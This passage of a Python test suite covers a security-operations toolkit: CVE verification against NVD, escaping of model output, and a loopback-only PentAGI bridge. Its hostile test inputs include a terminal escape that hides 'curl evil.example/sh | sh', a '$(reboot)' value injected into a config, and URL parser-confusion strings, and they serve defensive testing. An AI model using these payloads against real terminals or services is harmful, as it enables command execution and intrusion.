        self.assertEqual((res.flagged, res.cves), (10, 10))           # 3 not in NVD, 7 not checked

    def test_cve_lookups_stop_at_the_time_limit(self):
        import time as real_time
        (self.secops / "cache").mkdir()
        (self.secops / "cache" / "nvd-cache.json").write_text(json.dumps({"CVE-2021-44228": {
            "exists": True, "status": "Analyzed", "fetched": int(real_time.time()), "cpes": [["apache", "log4j"]],
            "v": self.flow.NVD_CACHE_VERSION}}))
        with mock.patch.object(self.flow, "NVD_TIME_LIMIT_S", 0):
            _, findings = self.flow.verify_cves(["CVE-2021-44227 CVE-2021-44228"])
        self.assertEqual(self.nvd.calls, [])
        self.assertEqual([f["verdict"] for f in findings], ["NOT CHECKED (time limit)", "EXISTS (check vendor)"])

    def test_nvd_cache_ages(self):
        import time as real_time
        now, day = int(real_time.time()), 86400
        v = self.flow.NVD_CACHE_VERSION
        cache = {"CVE-2021-0001": {"exists": True, "status": "Analyzed", "fetched": now - 29 * day, "v": v},
                 "CVE-2021-0002": {"exists": True, "status": "Analyzed", "fetched": now - 31 * day, "v": v},
                 "CVE-2021-0003": {"exists": True, "status": "Awaiting Analysis", "fetched": now - 2 * day, "v": v},
                 "CVE-2021-0004": {"exists": False, "fetched": now - 3600, "v": v},
                 "CVE-2021-0005": {"exists": False, "fetched": now - 2 * day, "v": v},
                 "CVE-2021-0006": {"exists": True, "status": "Analyzed", "v": v},                 # no time
                 "CVE-2021-0007": {"exists": True, "status": "Analyzed", "fetched": now - 60}}    # an older format
        (self.secops / "cache").mkdir()
        (self.secops / "cache" / "nvd-cache.json").write_text(json.dumps(cache))
        self.nvd.records["CVE-2021-0003"] = nvd_record("CVE-2021-0003", status="Rejected")   # since rejected
        md, _ = self.flow.verify_cves([" ".join(cache)])
        self.assertEqual(sorted(c[0] for c in self.nvd.calls),
                         ["CVE-2021-0002", "CVE-2021-0003", "CVE-2021-0005", "CVE-2021-0006", "CVE-2021-0007"])
        self.assertIn("| CVE-2021-0003 | REJECTED in NVD |", md)
        self.nvd.calls.clear()
        self.flow.verify_cves(["CVE-2021-0005 CVE-2021-0003"])         # "not in NVD" is kept for a day too
        self.assertEqual(self.nvd.calls, [])

    def test_expect_matches_vendor_and_product_exactly(self):
        self.nvd.records.update({
            "CVE-2017-5638": nvd_record("CVE-2017-5638", desc="The Jakarta Multipart parser in Apache Struts 2",
                                        cpes=["cpe:2.3:a:apache:struts:2.3.5:*:*:*:*:*:*:*"]),
            "CVE-2021-44228": nvd_record("CVE-2021-44228", desc="Apache Log4j2 JNDI features",
                                         cpes=["cpe:2.3:a:apache:log4j:2.0:*:*:*:*:*:*:*"]),
            "CVE-2021-41773": nvd_record("CVE-2021-41773", desc="A flaw in Apache HTTP Server 2.4.49",
                                         cpes=["cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*"]),
            "CVE-2026-41234": nvd_record("CVE-2026-41234", status="Awaiting Analysis",
                                         desc="A flaw in Apache HTTP Server."),
            "CVE-2024-24989": nvd_record("CVE-2024-24989", desc="NGINX Plus HTTP/3 QUIC module",
                                         cpes=["cpe:2.3:a:f5:nginx_plus:r30:*:*:*:*:*:*:*"])})
        text = "CVE-2017-5638 CVE-2021-44228 CVE-2021-41773 CVE-2026-41234 CVE-2024-24989"

        def verdicts(expect):
            return {f["cve"]: f["verdict"] for f in self.flow.verify_cves([text], expect)[1]}
        self.assertEqual(verdicts("Apache,HTTP_Server"), {
            "CVE-2017-5638": "MISMATCH (other vendor or product)",     # "Apache" in the text isn't enough
            "CVE-2021-44228": "MISMATCH (other vendor or product)",
            "CVE-2021-41773": "MATCHES target",
            "CVE-2026-41234": "UNCONFIRMED (NVD lists no vulnerable product yet)",
            "CVE-2024-24989": "MISMATCH (other vendor or product)"})
        self.assertEqual(verdicts("apache")["CVE-2017-5638"], "MATCHES target")
        self.assertEqual(verdicts("f5,nginx")["CVE-2024-24989"], "MISMATCH (other vendor or product)")  # not nginx_plus
        self.assertEqual(verdicts("f5,nginx_plus")["CVE-2024-24989"], "MATCHES target")
        for bad in ("nginx,f5,nginx_plus", "apache:http_server", ",x"):
            with self.subTest(bad=bad), self.assertRaises(self.flow.SyncError):
                self.flow.verify_cves([text], bad)
        err = io.StringIO()
        with mock.patch.object(sys, "argv", ["secops-flow", "watch", "7", "--expect", "nginx,f5,nginx_plus"]), \
                mock.patch.object(self.flow, "watch") as w, contextlib.redirect_stderr(err):
            self.assertEqual(self.flow.main(), 2)                       # refused now, not after the flow ends
        w.assert_not_called()
        self.assertIn("--expect takes vendor[,product]", err.getvalue())

    def test_ids_written_with_lookalike_characters(self):
        for cid in ("CVE-2024-99999", "CVE-2024-99997", "CVE-2024-99996", "CVE-2021-44228"):
            self.nvd.records[cid] = nvd_record(cid)
        cyrillic = "\U00000421V\U00000415-2024-99998"                                   # Cyrillic C and E
        arabic = "CVE-\U00000662\U00000660\U00000662\U00000661-\U00000664\U00000664\U00000662\U00000662\U00000668"
        text = ("Confirmed: CVE\U000020102024\U0000201099999 (hyphens), " + cyrillic + ", "
                "CVE-2024-\U0000206099997 (a word joiner), CVE\U000022122024\U0000221299996 (minus signs), "
                "\U0000ff23\U0000ff36\U0000ff25-2021-44228 (fullwidth), " + arabic + " (Arabic-Indic digits), "
                "cve-2021-4\U000000ad4228 (a soft hyphen), RFC-2024-1234 (not an ID)")
        md, findings = self.flow.verify_cves([text])
        self.assertEqual(sorted(c[0] for c in self.nvd.calls),         # what a reader sees as an ID is checked
                         ["CVE-2021-44228", "CVE-2024-99996", "CVE-2024-99997", "CVE-2024-99999"])
        looks = {f["cve"]: f["verdict"] for f in findings if f["verdict"].startswith("LOOKALIKE")}
        shown = [s.encode("ascii", "backslashreplace").decode("ascii") for s in (cyrillic, arabic)]
        self.assertEqual(looks, {s: "LOOKALIKE ID (not checked)" for s in shown})
        self.assertIn("6 CVE IDs found (2 written with lookalike characters), 4 checked against NVD; **2 flagged**", md)
        self.assertTrue(md.isascii())

    def test_only_vulnerable_cpes_count_for_expect(self):
        # NVD's "running on" configurations: Zoom is vulnerable, the Windows it runs on is listed as not
        self.nvd.records["CVE-2022-22786"] = nvd_record("CVE-2022-22786", desc="Zoom Client for Meetings for Windows",
                                                        cpes=[("cpe:2.3:a:zoom:meetings:*:*:*:*:*:*:*:*", True),
                                                              ("cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*", False)])
        for expect, verdict in (("microsoft,windows", "MISMATCH (other vendor or product)"),
                                ("microsoft", "MISMATCH (other vendor or product)"), ("zoom,meetings", "MATCHES target")):
            with self.subTest(expect=expect):
                self.assertEqual(self.flow.verify_cves(["CVE-2022-22786"], expect)[1][0]["verdict"], verdict)

    def test_ids_past_the_list_are_only_counted(self):
        text = " ".join(f"CVE-2020-{n:05d}" for n in range(1, 21))
        with mock.patch.object(self.flow, "NVD_LIST_IDS", 5), mock.patch.object(self.flow, "NVD_MAX_IDS", 2), \
                mock.patch.object(self.flow, "NVD_COUNT_IDS", 8):
            md, findings = self.flow.verify_cves([text, text])
        self.assertEqual([c[0] for c in self.nvd.calls], ["CVE-2020-00001", "CVE-2020-00002"])
        self.assertEqual(md.count("| CVE-2020-"), 5)
        self.assertIn("At least 8 more distinct CVE IDs found: not listed or checked, and counted as flagged.", md)
        self.assertIn("13 CVE IDs found, 2 checked against NVD; **13 flagged**", md)
        self.assertEqual(findings[-1]["count"], 8)

    def test_an_nvd_answer_for_another_id_is_not_trusted(self):
        self.nvd.records["CVE-2021-0001"] = nvd_record("CVE-2021-9999")
        _, findings = self.flow.verify_cves(["CVE-2021-0001"])
        self.assertEqual((findings[0]["verdict"], findings[0]["error"]),
                         ("UNVERIFIED (NVD lookup failed)", "lookup failed (ValueError)"))

    def test_pentagi_url_must_be_plain_loopback(self):
        for url in ("https://10.0.0.5:8443/api/v1", "https://evil.example\\@127.0.0.1/api/v1",
                    "https://127.0.0.1.evil.example/api/v1", "ftp://127.0.0.1/api/v1", "https://127.0.0.1\u3002x/api",
                    "https://[127.0.0.1]:8443/api/v1"):
            mod = load("secops_flow_url", REPO / "bin" / "secops-flow.py",
                       {"SECOPS": str(self.secops), "PENTAGI_URL": url})
            err = io.StringIO()
            with self.subTest(url=url), mock.patch.object(sys, "argv", ["secops-flow", "report", "1"]), \
                    contextlib.redirect_stderr(err):
                self.assertEqual(mod.main(), 2)
                self.assertIn("PENTAGI_URL", err.getvalue())

    def test_malformed_token_is_never_echoed(self):
        for bad in ("zebra", "zebra-quartz glimmering", "firstlinetoken\nsecondlineword"):
            (self.secops / "env" / "pentagi-api-token").write_text(bad)
            with self.subTest(token=bad), self.assertRaises(self.flow.SyncError) as cm:
                self.flow._token()
            for piece in bad.split():
                self.assertNotIn(piece, str(cm.exception))

    def test_no_em_dashes(self):
        for rel in ("bin/secops-flow.py", "mcp/pentagi-bridge/pentagi_mcp.py", "bin/toolcall-test.py", "bin/bench-run.sh"):
            self.assertNotIn("\N{EM DASH}", (REPO / rel).read_text(encoding="utf-8"), rel)


# --------------------------------------------------------------------------- bin/toolcall-test.py
class TestToolcallTest(unittest.TestCase):
    """toolcall-test.py against a fake Ollama: what a model or the server sends is printed escaped."""

    def test_model_output_is_printed_escaped(self):
        import runpy
        import urllib.request
        osc52 = "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUvc2ggfCBzaA==\x07"       # writes `curl evil.example/sh | sh`
        answers = {"evil-name": {"choices": [{"message": {"tool_calls": [{"function": {
                       "name": "nmap_scan" + osc52 + "\x1b]0;pwned\x07", "arguments": '{"target": "10.0.0.1"}'}}]}}],
                       "usage": {"completion_tokens": "7\x1b[2J"}},
                   "evil-text": {"choices": [{"message": {"content": "Sure\u202e\u200b\ufe0f\x9b31m" + osc52}}]}}

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def reply(self, obj, code=200, reason=None):
                body = json.dumps(obj).encode()
                self.send_response(code, reason)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):                                           # /api/ps
                self.reply({"models": []})

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                if self.path != "/v1/chat/completions":
                    return self.reply({})                               # /api/generate: unload
                if body["model"] in answers:
                    return self.reply(answers[body["model"]])
                self.reply({}, 500, "Internal" + osc52)                # an HTTP error's reason phrase
        srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        fake, real_open = f"http://127.0.0.1:{srv.server_address[1]}", urllib.request.OpenerDirector.open

        def to_fake(opener, req, *a, **k):          # the script's BASE is Ollama's real port: never reach it
            if isinstance(req, str):
                req = req.replace("http://127.0.0.1:11434", fake, 1)
            else:
                req.full_url = req.full_url.replace("http://127.0.0.1:11434", fake, 1)
            return real_open(opener, req, *a, **k)
        out = io.StringIO()
        with mock.patch.object(urllib.request.OpenerDirector, "open", to_fake), \
                mock.patch.object(sys, "argv", ["toolcall-test.py", "evil-name", "evil-text", "evil-error"]), \
                contextlib.redirect_stdout(out):
            runpy.run_path(str(REPO / "bin" / "toolcall-test.py"), run_name="__main__")
        text = out.getvalue()
        self.assertEqual([c for c in text if not (c.isprintable() or c == "\n")], [])
        self.assertEqual(len(text.splitlines()), 3, text)
        for shown in ("out_tok=7\\x1b[2J  nmap_scan\\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUvc2ggfCBzaA==\\x07\\x1b]0;pwned\\x07"
                      '({"target": "10.0.0.1"})',
                      "no tool_calls; text: Sure\\u202e\\u200b\\ufe0f\\x9b31m\\x1b]52;c;",
                      "ERROR evil-error: HTTP Error 500: Internal\\x1b]52;c;"):
            self.assertIn(shown, text)


# --------------------------------------------------------------------------- pentagi MCP bridge
def _stub_mcp():
    fast = types.ModuleType("mcp.server.fastmcp")

    class FastMCP:
        def __init__(self, name):
            self.name = name

        def tool(self):
            return lambda f: f

        def run(self):
            pass
    fast.FastMCP = FastMCP
    return {"mcp": types.ModuleType("mcp"), "mcp.server": types.ModuleType("mcp.server"), "mcp.server.fastmcp": fast}


@unittest.skipUnless(HAVE_REQUESTS, NEEDS_REQUESTS)
class TestBridge(unittest.TestCase):
    BRIDGE = REPO / "mcp" / "pentagi-bridge" / "pentagi_mcp.py"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.secops = Path(self.tmp.name)
        (self.secops / "configs").mkdir()
        self.mods = mock.patch.dict(sys.modules, _stub_mcp())
        self.mods.start()
        env = {"SECOPS": str(self.secops), "PENTAGI_URL": "https://127.0.0.1:8443/api/v1"}
        self.env = mock.patch.dict(os.environ, env)
        self.env.start()
        os.environ.pop("PENTAGI_PROVIDER", None)
        self.bridge = load("pentagi_bridge", self.BRIDGE, {})

    def tearDown(self):
        self.env.stop()
        self.mods.stop()
        self.tmp.cleanup()

    def conf(self, text):
        (self.secops / "configs" / "stack.conf").write_bytes(text.encode())

    def test_default_from_plan_last_line_wins(self):
        self.conf("PENTAGI_DEFAULT_PROVIDER=local-a\nPENTAGI_DEFAULT_PROVIDER=local-b\r\n")
        self.assertEqual(self.bridge._default_provider(), "local-b")

    def test_env_overrides_plan(self):
        self.conf("PENTAGI_DEFAULT_PROVIDER=local-a\n")
        with mock.patch.dict(os.environ, {"PENTAGI_PROVIDER": "local-x"}):
            self.assertEqual(self.bridge._default_provider(), "local-x")
        with mock.patch.dict(os.environ, {"PENTAGI_PROVIDER": "x y"}), self.assertRaises(RuntimeError):
            self.bridge._default_provider()

    def test_no_default_is_an_error(self):
        with self.assertRaises(RuntimeError):
            self.bridge._default_provider()
        self.conf("PENTAGI_DEFAULT_PROVIDER=$(reboot)\n")
        with self.assertRaises(RuntimeError):
            self.bridge._default_provider()

    def test_create_flow_uses_the_default_at_call_time(self):
        calls = []
        self.conf("PENTAGI_DEFAULT_PROVIDER=local-a\n")
        with mock.patch.object(self.bridge, "_req", lambda *a, **k: calls.append((a, k)) or {"id": 1}):
            self.bridge.pentagi_create_flow("objective")
            self.conf("PENTAGI_DEFAULT_PROVIDER=local-b\n")          # re-plan while the bridge runs
            self.bridge.pentagi_create_flow("objective")
            self.bridge.pentagi_create_flow("objective", provider="local-c")
            with self.assertRaises(RuntimeError):
                self.bridge.pentagi_create_flow("objective", provider="bad provider")
        self.assertEqual([c[1]["json"]["provider"] for c in calls], ["local-a", "local-b", "local-c"])

    def test_limits_are_clamped(self):
        self.assertEqual(self.bridge._limit(0), 1)
        self.assertEqual(self.bridge._limit(-5), 1)
        self.assertEqual(self.bridge._limit(10_000), 200)
        self.assertEqual(self.bridge._limit("x"), 20)

    def test_loopback_parser_confusion(self):
        for url in ("https://[::1]:8443/api/v1", "https://LOCALHOST:8443/api/v1", "http://127.0.0.1:8080/api/v1"):
            self.assertTrue(self.bridge._loopback_url(url), url)
        for url in ("https://evil.example\\@localhost/api/v1", "https://user@127.0.0.1/api/v1",
                    "https://127.0.0.2/api/v1", "https://127.0.0.1 .evil/api", "https://127.0.0.1\u3002evil/api",
                    "https://0x7f.0.0.1/api", "file:///etc/passwd", "https://127.0.0.1\t/api"):
            self.assertFalse(self.bridge._loopback_url(url), url)

    def test_malformed_token_is_never_echoed(self):
        tok = self.secops / "token"
        with mock.patch.object(self.bridge, "TOKEN_FILE", str(tok)):
            for bad in ("zebra-quartz glimmering", "firstlinetoken\nsecondlineword"):
                tok.write_text(bad)
                with self.subTest(token=bad), self.assertRaises(RuntimeError) as cm:
                    self.bridge._token()
                for piece in bad.split():
                    self.assertNotIn(piece, str(cm.exception))

    def test_list_providers_without_a_default(self):
        with mock.patch.object(self.bridge, "_req", lambda *a, **k: [{"name": "local-a"}]):
            out = json.loads(self.bridge.pentagi_list_providers())
        self.assertIsNone(out["default"])

    def test_latest_messages_and_terminal_output_are_the_latest(self):
        db = [{"id": i, "type": "thoughts", "message": f"msg {i}", "text": f"line {i}"} for i in range(1, 51)]
        calls = []

        def fake_req(method, path, **kw):            # pentagi: ORDER BY id DESC, then the page
            p = kw["params"]
            calls.append((path, p))
            start = (p["page"] - 1) * p["pageSize"]
            kind = path.rstrip("/").rsplit("/", 1)[-1]
            return {kind: sorted(db, key=lambda r: -r["id"])[start:start + p["pageSize"]], "total": len(db)}
        with mock.patch.object(self.bridge, "_req", fake_req):
            msgs = json.loads(self.bridge.pentagi_flow_messages(7, limit=3))
            term = json.loads(self.bridge.pentagi_flow_terminal(7, limit=2))
        self.assertEqual([m["message"] for m in msgs], ["msg 48", "msg 49", "msg 50"])
        self.assertEqual([t["text"] for t in term], ["line 49", "line 50"])
        self.assertEqual([c[1]["pageSize"] for c in calls], [3, 2])     # no more rows than asked for

    def test_an_unparseable_url_is_refused_cleanly(self):
        self.assertFalse(self.bridge._loopback_url("https://[127.0.0.1]:8443/api/v1"))   # urlsplit raises here
        with self.assertRaises(SystemExit):
            load("pentagi_bridge_bad", self.BRIDGE, {"PENTAGI_URL": "https://[127.0.0.1]:8443/api/v1"})

    def test_loopback_only(self):
        self.assertFalse(self.bridge._HTTP.trust_env)
        for url in ("https://localhost.evil.example/api/v1", "https://10.0.0.5:8443/api/v1", "http://evil/api"):
            with self.subTest(url), self.assertRaises(SystemExit):
                load("pentagi_bridge_bad", self.BRIDGE, {"PENTAGI_URL": url})


# --------------------------------------------------------------------------- shell functional tests
@unittest.skipUnless(all(shutil.which(x) for x in ("bash", "git", "perl", "tar")), "needs bash, git, perl, tar")
class TestShellFunctional(unittest.TestCase):
    def run_script(self, name):
        # This interpreter's python3 goes first on PATH, so the scripts' Python runs on the version under test.
        # scope_test.sh injects a failure at every VM call: a few minutes idle, far more on a loaded machine.
        env = dict(os.environ, PATH=os.path.dirname(sys.executable) + os.pathsep + os.environ.get("PATH", ""))
        r = subprocess.run(["bash", str(REPO / "tests" / "func" / name), str(REPO)],
                           capture_output=True, text=True, timeout=1800, env=env)
        self.assertEqual(r.returncode, 0, f"\n{r.stdout}\n{r.stderr}")

    def test_bootstrap_upstream(self):
        self.run_script("bootstrap_test.sh")

    def test_install(self):
        self.run_script("install_test.sh")

    def test_scope_firewall(self):
        self.run_script("scope_test.sh")

    def test_check_secrets(self):
        self.run_script("check_secrets_test.sh")

    def test_audit_and_controls(self):
        # This interpreter's python3 goes first on PATH, so the Python inside secstack runs on the version
        # under test (3.9 is the Mac's /usr/bin/python3).
        env = dict(os.environ, PATH=os.path.dirname(sys.executable) + os.pathsep + os.environ.get("PATH", ""))
        r = subprocess.run(["bash", str(REPO / "tests" / "func" / "audit_test.sh"), str(REPO)],
                           capture_output=True, text=True, timeout=1200, env=env)   # ~2.5 min idle, more under load
        self.assertEqual(r.returncode, 0, f"\n{r.stdout}\n{r.stderr}")


if __name__ == "__main__":
    unittest.main()
